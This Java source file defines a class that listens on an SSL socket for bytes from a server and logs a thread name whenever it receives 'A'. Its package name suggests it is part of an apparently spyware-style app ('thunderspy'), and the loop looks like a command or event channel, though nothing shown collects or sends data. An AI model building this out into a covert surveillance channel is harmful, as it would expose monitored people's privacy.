package com.thunderspy.spy.utils.etp;

import com.thunderspy.spy.utils.ThreadPoolManager;
import com.thunderspy.spy.utils.Utils;

import java.io.InputStream;
import java.io.OutputStream;

import javax.net.ssl.SSLSocket;

/**
 * Created by ariyan on 2/14/17.
 */

public final class Protocol {

    public static void generateEvent(SSLSocket sslSocket) {
        InputStream is = null;
        OutputStream os = null;
        try {

            is = sslSocket.getInputStream();
            os = sslSocket.getOutputStream();

            int r = 0;
            while((r = is.read()) != -1) {
                if((char)r == 'A') {
                    ThreadPoolManager.execute(new Runnable() {
                        @Override
                        public void run() {
                            Utils.log(Thread.currentThread().getName());
                        }
                    });
                }
            }
            throw new Exception("Connection is lost to server");
        } catch (Exception exp) {
            Utils.log("ETP Error: %s", exp.getMessage());
            try {
                try {
                    if (os != null)
                        os.flush();
                } catch (Exception exp1){}
                try {
                    if (os != null)
                        os.close();
                } catch (Exception exp1){}
                try {
                    if (is != null)
                        is.close();
                } catch (Exception exp1){}
                try {
                    if (sslSocket != null)
                        sslSocket.close();
                } catch (Exception exp1){}
            } catch (Exception exp1) {}
        }
    }

}














